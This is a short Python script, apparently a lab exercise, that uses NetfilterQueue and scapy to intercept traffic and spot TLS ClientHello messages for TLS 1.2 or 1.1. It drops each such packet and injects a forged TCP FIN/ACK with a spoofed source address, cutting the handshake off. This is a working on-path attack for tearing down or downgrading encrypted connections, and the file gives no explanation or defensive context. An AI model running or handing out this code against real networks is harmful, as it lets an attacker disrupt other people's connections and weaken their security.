from netfilterqueue import NetfilterQueue
from scapy.all import *
import requests
import json
import re
import sys
import pickle
import os 
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import re

def ex_4(pkt):

    data_packet = IP(pkt.get_payload())

    
    if data_packet.haslayer("Raw"):

        tcpPayload = data_packet["Raw"].load

        if tcpPayload[0] == 0x16 and tcpPayload[1] == 0x03 and tcpPayload[2] == 0x01 and (tcpPayload[10] == 0x03 or tcpPayload[10] == 0x02):
            
            print("CLIENT HELLO DETECTED")

            pkt.drop()

            tcp_pkt_payload = list(tcpPayload)
            

            new_packet = IP(dst=data_packet[IP].dst, src='172.16.0.3')/TCP()

            new_packet[TCP].sport = data_packet[TCP].sport
            new_packet[TCP].dport = data_packet[TCP].dport
            new_packet[TCP].seq = data_packet[TCP].seq
            new_packet[TCP].ack = data_packet[TCP].ack
            new_packet[TCP].flags = 'FA'

            print("#### NEW PACKET ####")
            new_packet.show()
            print("#### SENDING NEW PACKET ####")
            send(new_packet)
        
        else:
            pkt.accept()


    else:
        pkt.accept()

    

nfqueue = NetfilterQueue()
nfqueue.bind(0, ex_4, 100)

try:
    nfqueue.run()
except KeyboardInterrupt:
    print('')

nfqueue.unbind()
